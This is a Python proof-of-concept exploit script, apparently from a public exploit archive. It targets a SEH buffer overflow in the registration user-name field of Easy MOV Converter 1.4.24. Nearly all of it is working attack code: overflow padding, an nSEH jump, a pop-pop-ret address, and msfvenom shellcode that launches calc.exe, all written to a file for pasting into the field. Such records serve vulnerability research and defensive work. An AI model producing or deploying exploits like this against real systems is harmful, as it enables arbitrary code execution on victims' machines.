#!/usr/bin/python

###############################################################################
# Exploit Title:        Easy MOV Converter 1.4.24 - 'Enter User Name' Field Buffer Overflow (SEH)
# Date:                 13-06-2017
# Exploit Author:       @abatchy17 -- www.abatchy.com
# Vulnerable Software:  Easy MOV Converter 
# Vendor Homepage:      http://www.divxtodvd.net/
# Version:              1.4.24
# Software Link:        http://www.divxtodvd.net/easy_mov_converter.exe
# Tested On:            Windows 7 SP1 32bit
#
# Special thanks to @t_tot3s for pointing out how stupid I am. Credit to Muhann4d for discovering the PoC (41911).
#
# To reproduce the exploit:
#	1. Click Register
#	2. In the "Enter User Name" field, paste the content of exploit.txt
#
##############################################################################

# If you're using WinXP SP3, change this to 996
buffer = "\x41" * 1008

nSEH = "\xeb\x10\x90\x90"

# 0x1001145c : pop esi # pop ebx # ret 0x04 | ascii {PAGE_EXECUTE_READ} [SkinMagic.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v1.8.1.1 (C:\Program Files\Easy MOV Converter\SkinMagic.dll)
SEH = "\x5c\x14\x01\x10"

badchars = "\x00\x0a\x0d" # and 0x80 to 0xff

# msfvenom -p windows/exec CMD=calc.exe -b "\x00\x0a\x0d" -f python
buf =  ""
buf += "\xda\xd7\xd9\x74\x24\xf4\xba\x07\xc8\xf9\x11\x5e\x2b"
buf += "\xc9\xb1\x31\x31\x56\x18\x03\x56\x18\x83\xee\xfb\x2a"
buf += "\x0c\xed\xeb\x29\xef\x0e\xeb\x4d\x79\xeb\xda\x4d\x1d"
buf += "\x7f\x4c\x7e\x55\x2d\x60\xf5\x3b\xc6\xf3\x7b\x94\xe9"
buf += "\xb4\x36\xc2\xc4\x45\x6a\x36\x46\xc5\x71\x6b\xa8\xf4"
buf += "\xb9\x7e\xa9\x31\xa7\x73\xfb\xea\xa3\x26\xec\x9f\xfe"
buf += "\xfa\x87\xd3\xef\x7a\x7b\xa3\x0e\xaa\x2a\xb8\x48\x6c"
buf += "\xcc\x6d\xe1\x25\xd6\x72\xcc\xfc\x6d\x40\xba\xfe\xa7"
buf += "\x99\x43\xac\x89\x16\xb6\xac\xce\x90\x29\xdb\x26\xe3"
buf += "\xd4\xdc\xfc\x9e\x02\x68\xe7\x38\xc0\xca\xc3\xb9\x05"
buf += "\x8c\x80\xb5\xe2\xda\xcf\xd9\xf5\x0f\x64\xe5\x7e\xae"
buf += "\xab\x6c\xc4\x95\x6f\x35\x9e\xb4\x36\x93\x71\xc8\x29"
buf += "\x7c\x2d\x6c\x21\x90\x3a\x1d\x68\xfe\xbd\x93\x16\x4c"
buf += "\xbd\xab\x18\xe0\xd6\x9a\x93\x6f\xa0\x22\x76\xd4\x5e"
buf += "\x69\xdb\x7c\xf7\x34\x89\x3d\x9a\xc6\x67\x01\xa3\x44"
buf += "\x82\xf9\x50\x54\xe7\xfc\x1d\xd2\x1b\x8c\x0e\xb7\x1b"
buf += "\x23\x2e\x92\x7f\xa2\xbc\x7e\xae\x41\x45\xe4\xae"

junk = "\x90" * 16

badchars = "\x0a\x0d"

data = buffer + nSEH + SEH + junk + buf

f = open ("exploit.txt", "w")
f.write(data)
f.close()
